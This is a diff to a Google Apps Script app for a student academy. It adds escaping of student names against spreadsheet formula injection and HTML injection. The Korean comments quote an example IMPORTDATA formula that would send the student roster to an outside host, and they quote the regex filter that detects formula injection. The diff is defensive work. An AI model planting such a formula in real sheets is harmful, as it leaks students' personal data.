@@ -3209,7 +3209,15 @@ function jacketWatch_() {
   });
   if (!out.length) return;
 
-  gr.getRange(gr.getLastRow() + 1, 1, out.length, JACKET_HEADERS.length).setValues(out);
+  /* 🔴 시트 칸에 넣기 전에 `행소독_` 을 지난다 — 이름의 출처가 크루카드 웹앱의 익명 `doPost` 라
+   *   (`crewcard/크루카드.js` → 상담시트 → `syncProfiles` → profiles → 여기) `=` 로 시작하는 이름은
+   *   이 칸에서 **수식으로 실행된다**. `=IMPORTDATA("…?d="&TEXTJOIN(",",1,profiles!B2:B60))` 한 줄이면
+   *   같은 파일의 학생 명부가 밖으로 나간다 — 사람이 그 칸을 클릭할 필요도 없다(시트가 스스로 평가한다).
+   * ⚠ profiles 를 이미 지났다고 안전한 게 아니다: 거기서 붙는 아포스트로피는 저장할 때 소비돼
+   *   `getValues` 가 «원문»을 돌려준다. 소독은 **쓰는 자리마다** 다시 해야 한다.
+   * `셀안전_` 을 손으로 map 하지 않고 `행소독_` 을 쓴다 — 문자열만 소독하고 숫자(재원개월·누적P)는
+   *   타입을 지킨다. 같은 방어를 N번째 손으로 얹는 순간 N+1번째가 빠진다(v9.157 머리말). */
+  gr.getRange(gr.getLastRow() + 1, 1, out.length, JACKET_HEADERS.length).setValues(행소독_(out));
   if (quotaOk(1)) {
     adminMail('[SYNK] 🧥 ' + JACKET_ITEM_NAME + ' 지급 대상 ' + out.length + '명',
       out.map(o => '· ' + o[1] + ' (' + o[0] + ') — 재원 ' + o[3] + '개월 · 누적 ' + o[4] + 'P').join('\n') +
@@ -4722,10 +4730,25 @@ function buildMonthlyCards_() {
      *   ✕#fff → Paper(순백 금지 · 킷 철칙 ①) · ✕#E5E7EB → Stitch(구분선의 정본은 실땀) ·
      *   ✕#6B7280 → Ash Wool(양모 회색 3 = 캡션 자리) · ✕#1D1D1C → Ink(Graphite 2 는 퇴역 대기).
      *   ⚠ 화면 층의 같은 회색 39곳은 이 트랙 밖이다 — 별건(트랙 §6). */
+    /* 🔴 이름은 **반드시 `escHtml_` 를 거친다** — 출처가 크루카드 웹앱의 익명 `doPost` 다
+     *   (`crewcard/크루카드.js` → 상담시트 → `syncProfiles` → profiles → 여기).
+     *   그 통로의 유일한 소독기 `셀안전_` 은 «수식 실행»만 막고 `<`·`>` 는 그대로 통과시킨다
+     *   (정규식이 /^[=+\-@\t\r]/ 라 `<img …>` 는 아예 안 걸린다). 게다가 아포스트로피 접두는
+     *   저장할 때 소비돼 `getValues` 가 원문을 돌려주므로, profiles 를 거쳐도 태그는 **온전히** 온다.
+     * 그리는 자리(09-03 실측 · 이 시트를 읽는 곳은 하나뿐): `printMonthlyCards` 가 이 HTML 을
+     *   A4 그리드로 이어 붙여 Drive 「SYNK_인쇄」 에 .html·.pdf 로 굽고 원장 메일로 링크를 보낸다.
+     *   원장이 인쇄하려고 그 파일을 여는 순간 마크업이 산다 — 그 한 장에 **그달 재원생 전원의
+     *   이름**이 있다(태그는 그날 받은 몇 명, 이건 전원이다). 안전 넷 「학생 식별 데이터」 위반이다.
+     * ⚠ 과잠 태그(`jacketPrintTags_`)보다 나쁜 점: 여기서 만든 HTML 은 `synk_cards` 시트에
+     *   **저장돼 남는다** — 한 번 들어가면 지우기 전까지 매달 그 파일에 다시 실린다.
+     * 🚫 나머지는 **감싸지 않는다** — 감싸면 우리가 일부러 넣은 태그가 글자로 보인다:
+     *   `ym`=formatDate · `tier[1]`·`tier[3]`=CARD_TIERS 상수 · `stat`=숫자와 상수만 ·
+     *   `playStyleOf_`=PLAY_STYLES 상수표 · `s.mon`=profiles S19(엔진이 쓰는 «지나온 장면 수» 숫자) ·
+     *   `mi`=contents 시트 guide 행(원장 손·씨앗). 사람이 «익명으로» 넣는 값은 이름 하나뿐이다. */
     return [ym, s.id, CARD_WEBFONT + '<div style="' + CARD_FONT + 'background:' + tier[2] + ';border:2px solid #FBB7A3;border-radius:18px;padding:10px;max-width:230px;box-shadow:0 6px 18px rgba(249,104,89,.14);">' +
       '<div style="background:#FBF7F0;border-radius:12px;padding:10px 12px;text-align:center;">' +
       '<div style="font-size:11px;color:#8D857A;">SYNK ' + ym + ' · ' + tier[3] + ' ' + tier[1] + '</div>' +
-      '<div style="font-size:17px;font-weight:800;padding:3px 0;">' + s.nm + '</div>' +
+      '<div style="font-size:17px;font-weight:800;padding:3px 0;">' + escHtml_(s.nm) + '</div>' +
       (mi.indexOf('http') === 0 ? '<img src="' + mi + '" style="width:72px;image-rendering:pixelated;display:block;margin:2px auto 0;"/>' : '') + // [v9.35] A안 이미지에도 무해
       '<div style="font-size:12px;color:#2B2320;">' + s.mon + '와 함께한 한 달</div>' +
       '<div style="font-size:11px;color:#8D857A;padding-top:2px;">' + (function(){ const ps2 = playStyleOf_(cardLogs[s.id] || []); return ps2[0] + ' ' + ps2[1]; })() + '</div>' +
